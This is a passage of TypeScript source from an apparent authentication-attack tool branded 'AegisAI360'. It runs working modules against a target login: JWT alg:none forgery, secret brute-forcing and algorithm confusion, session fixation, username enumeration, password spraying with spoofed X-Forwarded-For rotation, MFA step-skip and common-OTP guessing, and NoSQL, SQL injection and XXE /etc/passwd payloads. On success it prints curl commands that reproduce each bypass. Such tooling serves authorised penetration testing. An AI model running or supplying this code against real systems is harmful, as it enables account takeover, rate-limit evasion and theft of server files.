    // ── JWT ATTACK ────────────────────────────────────────────────────────
    if (techniques.includes("jwt-attack") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 6: JWT Attack (alg:none + weak-secret brute + claim forge + expired) ──`]);
      const isHttps = config.port === 443 || config.target.startsWith("https://");
      const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      let capturedJwt: string | null = null;
      let decodedPayload: any = null;

      for (const cred of [{ u: "admin", p: "admin" }, { u: "test", p: "test" }, { u: "guest", p: "" }]) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, cred.u, cred.p));
        const jwt = extractJwt(r.body, r.headers);
        if (jwt) {
          const dec = decodeJwt(jwt);
          capturedJwt = jwt; decodedPayload = dec?.payload;
          add({
            technique: "jwt-attack", username: cred.u, password: cred.p, status: "info", statusCode: r.code,
            evidence: `JWT captured via ${cred.u}:${cred.p} — alg=${dec?.header?.alg} payload=${JSON.stringify(dec?.payload).slice(0, 200)}`,
          });
          break;
        }
      }

      if (capturedJwt && decodedPayload) {
        // alg:none
        const noneToken = forgeNoneJwt({ ...decodedPayload, role: "admin", is_admin: true, isAdmin: true, admin: true });
        const rNone = await doRequest({
          hostname, port: config.port, path: config.loginPath, method: "GET", isHttps, body: "",
          headers: {
            "Authorization": `Bearer ${noneToken}`,
            "Cookie": `token=${noneToken}; jwt=${noneToken}; access_token=${noneToken}`,
            "User-Agent": "Mozilla/5.0 (AegisAI360-JWT)",
          },
        });
        const noneOk = rNone.code >= 200 && rNone.code < 400 && isBypass(rNone.code, rNone.body);
        add({
          technique: "jwt-attack", username: "(alg:none)", password: "-",
          status: noneOk ? "jwt_vuln" : "info", statusCode: rNone.code,
          evidence: noneOk
            ? `CRITICAL: JWT alg:none SUCCEEDED — server accepted unsigned token with forged admin claims`
            : `JWT alg:none rejected — server validates algorithm (HTTP ${rNone.code})`,
          curlCommand: noneOk ? `curl -sk -H "Authorization: Bearer ${noneToken}" "${isHttps ? "https" : "http"}://${hostname}:${config.port}${config.loginPath}"` : undefined,
        });

        // Weak secret brute
        let secretFound = "";
        for (const secret of JWT_SECRETS) {
          if (!job.active) break;
          const forged = forgeHmac({ ...decodedPayload, role: "admin", is_admin: true }, secret);
          const rf = await doRequest({
            hostname, port: config.port, path: config.loginPath, method: "GET", isHttps, body: "",
            headers: { "Authorization": `Bearer ${forged}`, "Cookie": `token=${forged}` },
          });
          if (isBypass(rf.code, rf.body)) {
            secretFound = secret;
            add({
              technique: "jwt-attack", username: `(secret="${secret}")`, password: "-",
              status: "jwt_vuln", statusCode: rf.code,
              evidence: `CRITICAL: JWT secret CRACKED: "${secret}" — forged admin HS256 token accepted`,
              curlCommand: `curl -sk -H "Authorization: Bearer ${forged}" "${isHttps ? "https" : "http"}://${hostname}:${config.port}${config.loginPath}"`,
            });
            break;
          }
          await delay(30);
        }
        if (!secretFound) {
          add({
            technique: "jwt-attack", username: `(${JWT_SECRETS.length} secrets)`, password: "-",
            status: "info", evidence: `JWT weak secret brute: ${JWT_SECRETS.length} common secrets tested — none matched`,
          });
        }

        // Expired token reuse
        const expiredPayload = { ...decodedPayload, exp: Math.floor(Date.now() / 1000) - 86400 };
        const expToken = forgeHmac(expiredPayload, secretFound || "secret");
        const rExp = await doRequest({
          hostname, port: config.port, path: config.loginPath, method: "GET", isHttps, body: "",
          headers: { "Authorization": `Bearer ${expToken}`, "Cookie": `token=${expToken}` },
        });
        add({
          technique: "jwt-attack", username: "(expired token)", password: "-",
          status: rExp.code < 400 ? "jwt_vuln" : "info", statusCode: rExp.code,
          evidence: rExp.code < 400
            ? `CRITICAL: Expired JWT accepted (exp was ${expiredPayload.exp}) — no expiry validation`
            : `Expired token correctly rejected — HTTP ${rExp.code}`,
        });

        // HS256 algorithm confusion (if original was RS256)
        if (decodedPayload && decodedPayload.alg !== "HS256") {
          const confusionToken = forgeHmac({ ...decodedPayload, role: "admin" }, capturedJwt.split(".")[1]);
          const rCon = await doRequest({
            hostname, port: config.port, path: config.loginPath, method: "GET", isHttps, body: "",
            headers: { "Authorization": `Bearer ${confusionToken}` },
          });
          add({
            technique: "jwt-attack", username: "(RS256→HS256 confusion)", password: "-",
            status: rCon.code < 400 ? "jwt_vuln" : "info", statusCode: rCon.code,
            evidence: rCon.code < 400
              ? `CRITICAL: Algorithm confusion attack succeeded — RS256 public key used as HS256 secret`
              : `Algorithm confusion rejected — HTTP ${rCon.code}`,
          });
        }
      } else {
        add({
          technique: "jwt-attack", username: "(no JWT detected)", password: "-", status: "info",
          evidence: `No JWT found in login responses — may use session cookies, SAML, or API keys`,
        });
      }
    }

    // ── SESSION SECURITY ──────────────────────────────────────────────────
    if (techniques.includes("session-security") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 7: Session Security (cookie flags + entropy + fixation + logout) ──`]);
      const isHttps = config.port === 443 || config.target.startsWith("https://");
      const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];

      const loginR = await doRequest(buildFormRequest(config, "admin", "admin"));
      const rawCookies = ((loginR.headers["set-cookie"] || []) as string[]);

      if (rawCookies.length > 0) {
        for (const cookie of rawCookies) {
          const name = cookie.split("=")[0];
          const value = cookie.split("=")[1]?.split(";")[0] || "";
          const hasHttpOnly = /httponly/i.test(cookie);
          const hasSecure = /;\s*secure/i.test(cookie);
          const sameSite = cookie.match(/samesite=([^;]+)/i)?.[1]?.trim() || "Not Set";
          const charEntropy = value.length > 0 ? new Set(value.split("")).size / value.length : 0;
          const issues: string[] = [];
          if (!hasHttpOnly) issues.push("Missing HttpOnly — XSS can steal this cookie");
          if (!hasSecure) issues.push("Missing Secure flag — sent over plain HTTP");
          if (sameSite.toLowerCase() === "none" || sameSite === "Not Set") issues.push(`SameSite=${sameSite} — CSRF risk`);
          if (charEntropy < 0.5 && value.length > 0) issues.push(`Low entropy (${(charEntropy * 100).toFixed(0)}%) — predictable token`);
          if (value.length > 0 && value.length < 16) issues.push(`Short session token (${value.length} chars)`);
          add({
            technique: "session-security", username: `cookie: ${name}`, password: "-",
            status: issues.length > 0 ? "session_vuln" : "info",
            evidence: issues.length > 0
              ? `Cookie "${name}" vulnerabilities: ${issues.join("; ")}`
              : `Cookie "${name}": HttpOnly=${hasHttpOnly} Secure=${hasSecure} SameSite=${sameSite} — well configured`,
          });
        }
      } else {
        add({
          technique: "session-security", username: "(no cookies)", password: "-", status: "info",
          evidence: `No Set-Cookie in login response — JWT/token-based or custom header auth`,
        });
      }

      // Session fixation
      const fixToken = `aegis_fixation_${randomBytes(8).toString("hex")}`;
      const rfx = await doRequest({
        hostname, port: config.port, path: config.loginPath, method: "POST", isHttps,
        body: `${config.usernameField}=admin&${config.passwordField}=admin`,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Cookie": `session=${fixToken}; PHPSESSID=${fixToken}; JSESSIONID=${fixToken}; sessionid=${fixToken}`,
          "User-Agent": "Mozilla/5.0 (AegisAI360-Fixation-Probe)",
        },
      });
      const fixResp = ((rfx.headers["set-cookie"] || []) as string[]).join(";");
      const fixVuln = fixResp.includes(fixToken);
      add({
        technique: "session-security", username: "(session fixation)", password: "-",
        status: fixVuln ? "session_vuln" : "info",
        evidence: fixVuln
          ? `CRITICAL: Session fixation confirmed — server reused the attacker's pre-set session token`
          : `Session fixation: server issued a fresh token after login (correctly rejecting pre-set token)`,
      });

      // Concurrent sessions
      const [s1, s2] = await Promise.all([
        doRequest(buildFormRequest(config, "admin", "admin")),
        doRequest(buildFormRequest(config, "admin", "admin")),
      ]);
      const tok1 = ((s1.headers["set-cookie"] || []) as string[]).join(";");
      const tok2 = ((s2.headers["set-cookie"] || []) as string[]).join(";");
      add({
        technique: "session-security", username: "(concurrent sessions)", password: "-",
        status: tok1 !== tok2 && tok1.length > 10 ? "info" : "session_vuln",
        evidence: tok1 === tok2
          ? `Concurrent login: server returned SAME session token for two simultaneous logins — possible session sharing bug`
          : `Concurrent login: different tokens issued — correct behavior`,
      });
    }

    // ── USERNAME ENUMERATION ──────────────────────────────────────────────
    if (techniques.includes("user-enum") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 8: Username Enumeration (timing + response length + error messages) ──`]);
      const probes = [
        { u: "admin", likely: true }, { u: "root", likely: true }, { u: "test", likely: true },
        { u: "user", likely: true }, { u: "administrator", likely: true },
        { u: "xyz_nonexistent_abc123", likely: false }, { u: "nope_invalid_999", likely: false },
        { u: "fake_zzzz_user_xyz", likely: false },
      ];
      const results: { u: string; likely: boolean; rt: number; code: number; len: number; msg: string }[] = [];
      for (const p of probes) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, p.u, "WRONG_PASS_xyz!@#$_99"));
        const msgMatch = r.body.toLowerCase().match(/(invalid|incorrect|wrong|not found|no account|unknown|does not exist)[^<.]{0,60}/)?.[0] || "";
        results.push({ u: p.u, likely: p.likely, rt: r.rt, code: r.code, len: r.body.length, msg: msgMatch.trim() });
        pushLog(job.trafficLog, [`[${ts()}] ENUM "${p.u}" → HTTP ${r.code} rt=${r.rt}ms len=${r.body.length}`]);
        await delay(150);
      }

      const likelyRts = results.filter(r => r.likely).map(r => r.rt);
      const unlikelyRts = results.filter(r => !r.likely).map(r => r.rt);
      const avgL = likelyRts.reduce((a, b) => a + b, 0) / (likelyRts.length || 1);
      const avgU = unlikelyRts.reduce((a, b) => a + b, 0) / (unlikelyRts.length || 1);
      const timingDiff = Math.abs(avgL - avgU);

      add({
        technique: "user-enum", username: "(timing analysis)", password: "-",
        status: timingDiff > 100 ? "timing_vuln" : "info",
        evidence: timingDiff > 100
          ? `Username enumeration via TIMING: ${timingDiff.toFixed(0)}ms difference (valid avg ${avgL.toFixed(0)}ms vs invalid avg ${avgU.toFixed(0)}ms) — valid usernames take measurably longer`
          : `Timing analysis: ${timingDiff.toFixed(0)}ms difference — below 100ms threshold, likely not exploitable`,
      });

      const likelyLens = results.filter(r => r.likely).map(r => r.len);
      const unlikelyLens = results.filter(r => !r.likely).map(r => r.len);
      const avgLL = likelyLens.reduce((a, b) => a + b, 0) / (likelyLens.length || 1);
      const avgUL = unlikelyLens.reduce((a, b) => a + b, 0) / (unlikelyLens.length || 1);
      const lenDiff = Math.abs(avgLL - avgUL);
      add({
        technique: "user-enum", username: "(response length)", password: "-",
        status: lenDiff > 50 ? "enum_found" : "info",
        evidence: lenDiff > 50
          ? `Username enumeration via RESPONSE LENGTH: ${lenDiff.toFixed(0)}B difference (valid avg ${avgLL.toFixed(0)}B vs invalid avg ${avgUL.toFixed(0)}B)`
          : `Response length consistent — no length-based enumeration detected`,
      });

      const msgs = results.map(r => r.msg);
      const likelyMsgs = msgs.filter((_, i) => results[i].likely);
      const unlikelyMsgs = msgs.filter((_, i) => !results[i].likely);
      const msgDiffers = likelyMsgs.some(m => !unlikelyMsgs.includes(m) && m.length > 3);
      add({
        technique: "user-enum", username: "(error messages)", password: "-",
        status: msgDiffers ? "enum_found" : "info",
        evidence: msgDiffers
          ? `Username enumeration via ERROR MESSAGES: different errors for valid vs invalid — "${likelyMsgs[0]}" vs "${unlikelyMsgs[0]}"`
          : `Generic error messages used — no message-based enumeration detected`,
      });
    }

    // ── PASSWORD SPRAY ────────────────────────────────────────────────────
    if (techniques.includes("password-spray") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 9: Password Spray (${SPRAY_PASSWORDS.length} passwords × top usernames, slow-drip) ──`]);
      const sprayUsers = ["admin", "administrator", "root", "user", "test", "manager",
        ...(config.customUsers || [])].slice(0, 10);
      for (const pass of SPRAY_PASSWORDS) {
        if (!job.active) break;
        for (const user of sprayUsers) {
          if (!job.active) break;
          const r = await doRequest(buildFormRequest(config, user, pass, {
            "X-Forwarded-For": ROTATION_IPS[Math.floor(Math.random() * ROTATION_IPS.length)],
          }));
          pushLog(job.trafficLog, [`[${ts()}] SPRAY "${user}":"${pass.slice(0, 20)}" → HTTP ${r.code}`]);
          if (isBypass(r.code, r.body)) {
            add({
              technique: "password-spray", username: user, password: pass,
              status: "spray_hit", statusCode: r.code, responseTime: r.rt,
              evidence: `Password spray HIT: ${user}:${pass} — HTTP ${r.code}`,
              curlCommand: makeCurl(config, user, pass),
            });
          }
          await delay(Math.floor(3000 / sprayUsers.length));
        }
      }
    }

    // ── MFA BYPASS ────────────────────────────────────────────────────────
    if (techniques.includes("mfa-bypass") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 10: MFA Bypass (step-skip + common OTPs + reuse + brute) ──`]);
      const isHttps = config.port === 443 || config.target.startsWith("https://");
      const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      const mfaPaths = ["/mfa", "/otp", "/2fa", "/verify", "/auth/verify", "/auth/2fa",
        "/login/otp", "/login/2fa", "/api/mfa", "/api/2fa", "/api/otp",
        "/account/2fa", "/security/verify", "/api/auth/2fa"];
      const protectedPaths = ["/dashboard", "/admin", "/api/user", "/api/me", "/home", "/profile", "/app"];

      // Step-skip
      for (const pp of protectedPaths) {
        if (!job.active) break;
        const r = await doRequest({
          hostname, port: config.port, path: pp, method: "GET", isHttps, body: "",
          headers: { "User-Agent": "Mozilla/5.0 (AegisAI360-MFA)", "Accept": "text/html,application/json" },
        });
        if (isBypass(r.code, r.body)) {
          add({
            technique: "mfa-bypass", username: "(step skip)", password: pp,
            status: "mfa_bypass", statusCode: r.code,
            evidence: `MFA step-skip: direct access to ${pp} returned HTTP ${r.code} without MFA step`,
            curlCommand: `curl -sk "${isHttps ? "https" : "http"}://${hostname}:${config.port}${pp}"`,
          });
        }
        await delay(100);
      }

      // Common OTPs
      for (const mfaPath of mfaPaths.slice(0, 5)) {
        if (!job.active) break;
        for (const otp of COMMON_OTPS) {
          if (!job.active) break;
          const otpBody = `code=${otp}&otp=${otp}&token=${otp}&mfa_code=${otp}&otp_code=${otp}&totp=${otp}`;
          const r = await doRequest({
            hostname, port: config.port, path: mfaPath, method: "POST", isHttps, body: otpBody,
            headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(Buffer.byteLength(otpBody)), "User-Agent": "Mozilla/5.0 (AegisAI360-OTP)" },
          });
          if (isBypass(r.code, r.body)) {
            add({
              technique: "mfa-bypass", username: `OTP: ${otp}`, password: mfaPath,
              status: "mfa_bypass", statusCode: r.code,
              evidence: `Common OTP "${otp}" accepted on ${mfaPath} — HTTP ${r.code}`,
              curlCommand: `curl -sk -X POST -d "code=${otp}&otp=${otp}&token=${otp}" "${isHttps ? "https" : "http"}://${hostname}:${config.port}${mfaPath}"`,
            });
            break;
          }
          await delay(100);
        }
      }

      add({
        technique: "mfa-bypass", username: "(summary)", password: "-", status: "info",
        evidence: `Tested ${protectedPaths.length} protected paths for step-skip, ${COMMON_OTPS.length} common OTPs (000000, 111111, 123456…) on ${mfaPaths.slice(0, 5).length} MFA endpoints`,
      });
    }

    // ── CONTENT-TYPE SWITCHING ────────────────────────────────────────────
    if (techniques.includes("content-type-switch") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 11: Content-Type Switching (JSON/XML/multipart/HPP) ──`]);
      const isHttps = config.port === 443 || config.target.startsWith("https://");
      const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      const u = config.usernameField; const p = config.passwordField;

      const variants = [
        { name: "JSON body", ct: "application/json", body: JSON.stringify({ [u]: "admin", [p]: "admin" }) },
        { name: "JSON $ne bypass", ct: "application/json", body: JSON.stringify({ [u]: "admin", [p]: { "$ne": "" } }) },
        { name: "JSON SQLi", ct: "application/json", body: JSON.stringify({ [u]: "admin' OR '1'='1'--", [p]: "x" }) },
        { name: "XML body", ct: "text/xml", body: `<?xml version="1.0"?><login><${u}>admin</${u}><${p}>admin</${p}></login>` },
        { name: "XML XXE", ct: "text/xml", body: `<?xml version="1.0"?><!DOCTYPE x[<!ENTITY e SYSTEM "file:///etc/passwd">]><login><${u}>&e;</${u}><${p}>x</${p}></login>` },
        { name: "HTTP param pollution", ct: "application/x-www-form-urlencoded", body: `${u}=admin&${p}=wrong&${u}=admin%27+OR+%271%27%3D%271` },
        { name: "Multipart form", ct: "multipart/form-data; boundary=----Ae360", body: `------Ae360\r\nContent-Disposition: form-data; name="${u}"\r\n\r\nadmin\r\n------Ae360\r\nContent-Disposition: form-data; name="${p}"\r\n\r\nadmin\r\n------Ae360--` },
        { name: "JSON array inject", ct: "application/json", body: JSON.stringify({ [u]: ["admin", "' OR '1'='1"], [p]: "x" }) },
        { name: "JSON null password", ct: "application/json", body: JSON.stringify({ [u]: "admin", [p]: null }) },
        { name: "JSON empty object", ct: "application/json", body: JSON.stringify({ [u]: "admin", [p]: {} }) },
      ];

      for (const v of variants) {
        if (!job.active) break;
        const r = await doRequest({
          hostname, port: config.port, path: config.loginPath, method: "POST", isHttps, body: v.body,
          headers: { "Content-Type": v.ct, "Content-Length": String(Buffer.byteLength(v.body)), "User-Agent": "Mozilla/5.0 (AegisAI360-CT)" },
        });
        pushLog(job.trafficLog, [`[${ts()}] CT-Switch "${v.name}" → HTTP ${r.code} len=${r.body.length}`]);
        const ok = isBypass(r.code, r.body) || (r.code >= 200 && r.code < 400 && Math.abs(r.body.length - baselineLen) > 200);
        if (ok) {
          add({
            technique: "content-type-switch", username: v.name, password: v.body.slice(0, 60),
            status: "bypassed", statusCode: r.code,
            evidence: `Content-type bypass via "${v.name}": HTTP ${r.code} body ${r.body.length}B`,
            curlCommand: `curl -sk -X POST -H "Content-Type: ${v.ct}" -d '${v.body.slice(0, 100)}' "${isHttps ? "https" : "http"}://${hostname}:${config.port}${config.loginPath}"`,
          });
        }
        await delay(100);
      }
    }

    job.active = false;
    jobs.delete(id);
  };

  run();
  return job;
}

export function getAuthJob(id: string): AuthTesterJob | undefined {
  return jobs.get(id);
}

export function stopAuthTest(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
